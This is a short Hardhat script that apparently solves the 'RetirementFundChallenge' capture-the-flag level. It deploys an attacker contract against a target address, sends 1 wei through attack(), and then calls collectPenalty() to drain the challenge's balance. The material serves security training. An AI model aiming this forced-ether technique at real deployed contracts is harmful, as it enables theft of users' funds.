import { ethers } from 'hardhat';

const address = '0xAA42Dfc7D478E90eE40eC467b5116FaD5abf1D48';

async function main() {
  const [targetFactory, attackerFactory] = await Promise.all([
    ethers.getContractFactory('RetirementFundChallenge'),
    ethers.getContractFactory('RetirementFundChallengeAttacker'),
  ]);
  const target = await targetFactory.attach(address);
  await target.deployed();

  console.log('Target deployed to:', target.address);

  const attacker = await attackerFactory.deploy(target.address);
  await attacker.deployed();

  console.log('Attacker deployed to:', attacker.address);

  let tx;

  console.log('1 - Attacking');
  tx = await attacker.attack({
    value: 1,
  });
  await tx.wait();

  console.log('2 - Collecting penalty');
  tx = await target.collectPenalty();
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
